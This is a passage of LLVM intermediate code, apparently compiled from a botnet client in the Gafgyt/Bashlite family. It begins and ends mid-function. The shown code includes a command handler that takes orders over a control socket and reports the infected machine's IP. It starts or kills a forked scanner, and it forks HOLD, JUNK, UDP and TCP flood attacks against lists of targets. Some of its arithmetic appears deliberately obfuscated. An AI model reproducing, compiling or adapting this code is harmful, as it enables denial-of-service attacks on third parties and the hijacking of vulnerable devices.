  %210 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %209) #2, !srcloc !8
  %211 = extractvalue { i64, i64* } %210, 0
  %212 = extractvalue { i64, i64* } %210, 1
  %213 = trunc i64 %211 to i32
  store i32 %213, i32* %20, align 4
  %214 = ptrtoint i64* %212 to i64
  %215 = trunc i64 %214 to i32
  store i32 %215, i32* %21, align 4
  br label %216

; <label>:216:                                    ; preds = %207
  br label %217

; <label>:217:                                    ; preds = %216
  %218 = load i32, i32* %8, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %219
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 8
  %223 = srem i32 %222, 64
  %224 = zext i32 %223 to i64
  %225 = shl i64 1, %224
  %226 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %228
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 8
  %232 = sdiv i32 %231, 64
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %226, i64 0, i64 %233
  %235 = load i64, i64* %234, align 8
  %236 = xor i64 %235, -1
  %237 = xor i64 %225, -1
  %238 = xor i64 9059140890793282491, -1
  %239 = and i64 %236, 9059140890793282491
  %240 = and i64 %235, %238
  %241 = and i64 %237, 9059140890793282491
  %242 = and i64 %225, %238
  %243 = or i64 %239, %240
  %244 = or i64 %241, %242
  %245 = xor i64 %243, %244
  %246 = or i64 %236, %237
  %247 = xor i64 %246, -1
  %248 = or i64 9059140890793282491, %238
  %249 = and i64 %247, %248
  %250 = or i64 %245, %249
  %251 = or i64 %235, %225
  store i64 %250, i64* %234, align 8
  %252 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %252, align 8
  %253 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %253, align 8
  %254 = load i32, i32* %8, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %255
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 8
  %259 = sub i32 %258, -89928711
  %260 = add i32 %259, 1
  %261 = add i32 %260, -89928711
  %262 = add nsw i32 %258, 1
  %263 = call i32 @select(i32 %261, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %263, i32* %15, align 4
  %264 = load i32, i32* %15, align 4
  %265 = icmp ne i32 %264, 0
  br i1 %265, label %266, label %277

; <label>:266:                                    ; preds = %217
  %267 = load i32, i32* %8, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %268
  %270 = getelementptr inbounds %struct.state_t, %struct.state_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 8
  %272 = call i32 @close(i32 %271)
  %273 = load i32, i32* %8, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %274
  %276 = getelementptr inbounds %struct.state_t, %struct.state_t* %275, i32 0, i32 1
  store i8 0, i8* %276, align 4
  br label %277

; <label>:277:                                    ; preds = %266, %217
  br label %278

; <label>:278:                                    ; preds = %277, %205, %114, %61
  br label %279

; <label>:279:                                    ; preds = %278
  %280 = load i32, i32* %8, align 4
  %281 = add i32 %280, -546773512
  %282 = add i32 %281, 1
  %283 = sub i32 %282, -546773512
  %284 = add nsw i32 %280, 1
  store i32 %283, i32* %8, align 4
  br label %57

; <label>:285:                                    ; preds = %57
  br label %52

; <label>:286:                                    ; preds = %52
  %287 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %287)
  br label %288

; <label>:288:                                    ; preds = %286, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i32 0, i32 0))
  br label %533

; <label>:40:                                     ; preds = %2
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @strcmp(i8* %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0)) #10
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %51, label %46

; <label>:46:                                     ; preds = %40
  %47 = load i32, i32* @mainCommSock, align 4
  %48 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i8* @inet_ntoa(i32 %48) #2
  %50 = call i32 (i32, i8*, ...) @sockprintf(i32 %47, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* %49)
  br label %533

; <label>:51:                                     ; preds = %40
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0)) #10
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %100, label %57

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %3, align 4
  %59 = icmp ne i32 %58, 2
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.49, i32 0, i32 0))
  br label %533

; <label>:63:                                     ; preds = %57
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %76, label %69

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* @scanPid, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %533

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* @scanPid, align 4
  %75 = call i32 @kill(i32 %74, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %63
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @strcmp(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0)) #10
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %99, label %82

; <label>:82:                                     ; preds = %76
  %83 = load i32, i32* @scanPid, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  br label %533

; <label>:86:                                     ; preds = %82
  %87 = call i32 @fork() #2
  store i32 %87, i32* %6, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0))
  %89 = load i32, i32* %6, align 4
  %90 = icmp ugt i32 %89, 0
  br i1 %90, label %91, label %93

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* %6, align 4
  store i32 %92, i32* @scanPid, align 4
  br label %533

; <label>:93:                                     ; preds = %86
  %94 = load i32, i32* %6, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %93
  br label %533

; <label>:97:                                     ; preds = %93
  br label %98

; <label>:98:                                     ; preds = %97
  call void @StartTheLelz(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:99:                                     ; preds = %76
  br label %100

; <label>:100:                                    ; preds = %99, %51
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0)) #10
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %162, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* %3, align 4
  %108 = icmp slt i32 %107, 4
  br i1 %108, label %121, label %109

; <label>:109:                                    ; preds = %106
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %121, label %115

; <label>:115:                                    ; preds = %109
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %115, %109, %106
  br label %533

; <label>:122:                                    ; preds = %115
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %7, align 8
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  store i32 %129, i32* %8, align 4
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  store i32 %133, i32* %9, align 4
  %134 = load i8*, i8** %7, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %153

; <label>:137:                                    ; preds = %122
  %138 = load i8*, i8** %7, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %139, i8** %10, align 8
  br label %140

; <label>:140:                                    ; preds = %150, %137
  %141 = load i8*, i8** %10, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %152

; <label>:143:                                    ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %10, align 8
  %148 = load i32, i32* %8, align 4
  %149 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %147, i32 %148, i32 %149)
  call void @_exit(i32 0) #12
  unreachable

; <label>:150:                                    ; preds = %143
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %151, i8** %10, align 8
  br label %140

; <label>:152:                                    ; preds = %140
  br label %161

; <label>:153:                                    ; preds = %122
  %154 = call i32 @listFork()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  br label %533

; <label>:157:                                    ; preds = %153
  %158 = load i8*, i8** %7, align 8
  %159 = load i32, i32* %8, align 4
  %160 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:161:                                    ; preds = %152
  br label %162

; <label>:162:                                    ; preds = %161, %100
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %226, label %168

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 4
  br i1 %170, label %183, label %171

; <label>:171:                                    ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 2
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #10
  %176 = icmp slt i32 %175, 1
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %177, %171, %168
  br label %533

; <label>:184:                                    ; preds = %177
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 1
  %187 = load i8*, i8** %186, align 8
  store i8* %187, i8** %11, align 8
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  store i32 %191, i32* %12, align 4
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %13, align 4
  %196 = load i8*, i8** %11, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %217

; <label>:199:                                    ; preds = %184
  %200 = load i8*, i8** %11, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %201, i8** %14, align 8
  br label %202

; <label>:202:                                    ; preds = %214, %199
  %203 = load i8*, i8** %14, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %216

; <label>:205:                                    ; preds = %202
  %206 = call i32 @listFork()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %214, label %208

; <label>:208:                                    ; preds = %205
  %209 = load i8*, i8** %14, align 8
  %210 = load i32, i32* %12, align 4
  %211 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %209, i32 %210, i32 %211)
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = call i32 @close(i32 %212)
  call void @_exit(i32 0) #12
  unreachable

; <label>:214:                                    ; preds = %205
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %215, i8** %14, align 8
  br label %202

; <label>:216:                                    ; preds = %202
  br label %225

; <label>:217:                                    ; preds = %184
  %218 = call i32 @listFork()
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  br label %533

; <label>:221:                                    ; preds = %217
  %222 = load i8*, i8** %11, align 8
  %223 = load i32, i32* %12, align 4
  %224 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %222, i32 %223, i32 %224)
  call void @_exit(i32 0) #12
  unreachable

; <label>:225:                                    ; preds = %216
  br label %226

; <label>:226:                                    ; preds = %225, %162
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 0
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %345, label %232

; <label>:232:                                    ; preds = %226
  %233 = load i32, i32* %3, align 4
  %234 = icmp slt i32 %233, 6
  br i1 %234, label %280, label %235

; <label>:235:                                    ; preds = %232
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %280, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %280, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %280, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp eq i32 %257, -1
  br i1 %258, label %280, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 5
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp sgt i32 %263, 65500
  br i1 %264, label %280, label %265

; <label>:265:                                    ; preds = %259
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 4
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = icmp sgt i32 %269, 32
  br i1 %270, label %280, label %271

; <label>:271:                                    ; preds = %265
  %272 = load i32, i32* %3, align 4
  %273 = icmp eq i32 %272, 7
  br i1 %273, label %274, label %281

; <label>:274:                                    ; preds = %271
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 6
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = icmp slt i32 %278, 1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %274, %265, %259, %253, %247, %241, %235, %232
  br label %533

; <label>:281:                                    ; preds = %274, %271
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 1
  %284 = load i8*, i8** %283, align 8
  store i8* %284, i8** %15, align 8
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 2
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 %288, i32* %16, align 4
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 3
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  store i32 %292, i32* %17, align 4
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 4
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  store i32 %296, i32* %18, align 4
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 5
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* %299) #10
  store i32 %300, i32* %19, align 4
  %301 = load i32, i32* %3, align 4
  %302 = icmp eq i32 %301, 7
  br i1 %302, label %303, label %308

; <label>:303:                                    ; preds = %281
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 6
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @atoi(i8* %306) #10
  br label %309

; <label>:308:                                    ; preds = %281
  br label %309

; <label>:309:                                    ; preds = %308, %303
  %310 = phi i32 [ %307, %303 ], [ 10, %308 ]
  store i32 %310, i32* %20, align 4
  %311 = load i8*, i8** %15, align 8
  %312 = call i8* @strstr(i8* %311, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %313 = icmp ne i8* %312, null
  br i1 %313, label %314, label %333

; <label>:314:                                    ; preds = %309
  %315 = load i8*, i8** %15, align 8
  %316 = call i8* @strtok(i8* %315, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %316, i8** %21, align 8
  br label %317

; <label>:317:                                    ; preds = %330, %314
  %318 = load i8*, i8** %21, align 8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %332

; <label>:320:                                    ; preds = %317
  %321 = call i32 @listFork()
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %330, label %323

; <label>:323:                                    ; preds = %320
  %324 = load i8*, i8** %21, align 8
  %325 = load i32, i32* %16, align 4
  %326 = load i32, i32* %17, align 4
  %327 = load i32, i32* %18, align 4
  %328 = load i32, i32* %19, align 4
  %329 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %324, i32 %325, i32 %326, i32 %327, i32 %328, i32 %329)
  call void @_exit(i32 0) #12
  unreachable

; <label>:330:                                    ; preds = %320
  %331 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %331, i8** %21, align 8
  br label %317

; <label>:332:                                    ; preds = %317
  br label %344

; <label>:333:                                    ; preds = %309
  %334 = call i32 @listFork()
  %335 = icmp ne i32 %334, 0
  br i1 %335, label %336, label %337

; <label>:336:                                    ; preds = %333
  br label %533

; <label>:337:                                    ; preds = %333
  %338 = load i8*, i8** %15, align 8
  %339 = load i32, i32* %16, align 4
  %340 = load i32, i32* %17, align 4
  %341 = load i32, i32* %18, align 4
  %342 = load i32, i32* %19, align 4
  %343 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %338, i32 %339, i32 %340, i32 %341, i32 %342, i32 %343)
  call void @_exit(i32 0) #12
  unreachable

; <label>:344:                                    ; preds = %332
  br label %345

; <label>:345:                                    ; preds = %344, %226
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 0
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 @strcmp(i8* %348, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i32 0, i32 0)) #10
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %472, label %351

; <label>:351:                                    ; preds = %345
  %352 = load i32, i32* %3, align 4
  %353 = icmp slt i32 %352, 6
  br i1 %353, label %396, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 3
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #10
  %359 = icmp eq i32 %358, -1
  br i1 %359, label %396, label %360

; <label>:360:                                    ; preds = %354
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 2
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @atoi(i8* %363) #10
  %365 = icmp eq i32 %364, -1
  br i1 %365, label %396, label %366

; <label>:366:                                    ; preds = %360
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 4
  %369 = load i8*, i8** %368, align 8
  %370 = call i32 @atoi(i8* %369) #10
  %371 = icmp eq i32 %370, -1
  br i1 %371, label %396, label %372

; <label>:372:                                    ; preds = %366
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 4
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 @atoi(i8* %375) #10
  %377 = icmp sgt i32 %376, 32
  br i1 %377, label %396, label %378

; <label>:378:                                    ; preds = %372
  %379 = load i32, i32* %3, align 4
  %380 = icmp sgt i32 %379, 6
  br i1 %380, label %381, label %387

; <label>:381:                                    ; preds = %378
  %382 = load i8**, i8*** %4, align 8
  %383 = getelementptr inbounds i8*, i8** %382, i64 6
  %384 = load i8*, i8** %383, align 8
  %385 = call i32 @atoi(i8* %384) #10
  %386 = icmp slt i32 %385, 0
  br i1 %386, label %396, label %387

; <label>:387:                                    ; preds = %381, %378
  %388 = load i32, i32* %3, align 4
  %389 = icmp eq i32 %388, 8
  br i1 %389, label %390, label %397

; <label>:390:                                    ; preds = %387
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 7
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #10
  %395 = icmp slt i32 %394, 1
  br i1 %395, label %396, label %397

; <label>:396:                                    ; preds = %390, %381, %372, %366, %360, %354, %351
  br label %533

; <label>:397:                                    ; preds = %390, %387
  %398 = load i8**, i8*** %4, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 1
  %400 = load i8*, i8** %399, align 8
  store i8* %400, i8** %22, align 8
  %401 = load i8**, i8*** %4, align 8
  %402 = getelementptr inbounds i8*, i8** %401, i64 2
  %403 = load i8*, i8** %402, align 8
  %404 = call i32 @atoi(i8* %403) #10
  store i32 %404, i32* %23, align 4
  %405 = load i8**, i8*** %4, align 8
  %406 = getelementptr inbounds i8*, i8** %405, i64 3
  %407 = load i8*, i8** %406, align 8
  %408 = call i32 @atoi(i8* %407) #10
  store i32 %408, i32* %24, align 4
  %409 = load i8**, i8*** %4, align 8
  %410 = getelementptr inbounds i8*, i8** %409, i64 4
  %411 = load i8*, i8** %410, align 8
  %412 = call i32 @atoi(i8* %411) #10
  store i32 %412, i32* %25, align 4
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 5
  %415 = load i8*, i8** %414, align 8
  store i8* %415, i8** %26, align 8
  %416 = load i32, i32* %3, align 4
  %417 = icmp eq i32 %416, 8
  br i1 %417, label %418, label %423

; <label>:418:                                    ; preds = %397
  %419 = load i8**, i8*** %4, align 8
  %420 = getelementptr inbounds i8*, i8** %419, i64 7
  %421 = load i8*, i8** %420, align 8
  %422 = call i32 @atoi(i8* %421) #10
  br label %424

; <label>:423:                                    ; preds = %397
  br label %424

; <label>:424:                                    ; preds = %423, %418
  %425 = phi i32 [ %422, %418 ], [ 10, %423 ]
  store i32 %425, i32* %27, align 4
  %426 = load i32, i32* %3, align 4
  %427 = icmp sgt i32 %426, 6
  br i1 %427, label %428, label %433

; <label>:428:                                    ; preds = %424
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 6
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #10
  br label %434

; <label>:433:                                    ; preds = %424
  br label %434

; <label>:434:                                    ; preds = %433, %428
  %435 = phi i32 [ %432, %428 ], [ 0, %433 ]
  store i32 %435, i32* %28, align 4
  %436 = load i8*, i8** %22, align 8
  %437 = call i8* @strstr(i8* %436, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %438 = icmp ne i8* %437, null
  br i1 %438, label %439, label %459

; <label>:439:                                    ; preds = %434
  %440 = load i8*, i8** %22, align 8
  %441 = call i8* @strtok(i8* %440, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %441, i8** %29, align 8
  br label %442

; <label>:442:                                    ; preds = %456, %439
  %443 = load i8*, i8** %29, align 8
  %444 = icmp ne i8* %443, null
  br i1 %444, label %445, label %458

; <label>:445:                                    ; preds = %442
  %446 = call i32 @listFork()
  %447 = icmp ne i32 %446, 0
  br i1 %447, label %456, label %448

; <label>:448:                                    ; preds = %445
  %449 = load i8*, i8** %29, align 8
  %450 = load i32, i32* %23, align 4
  %451 = load i32, i32* %24, align 4
  %452 = load i32, i32* %25, align 4
  %453 = load i8*, i8** %26, align 8
  %454 = load i32, i32* %28, align 4
  %455 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %449, i32 %450, i32 %451, i32 %452, i8* %453, i32 %454, i32 %455)
  call void @_exit(i32 0) #12
  unreachable

; <label>:456:                                    ; preds = %445
  %457 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %457, i8** %29, align 8
  br label %442

; <label>:458:                                    ; preds = %442
  br label %471

; <label>:459:                                    ; preds = %434
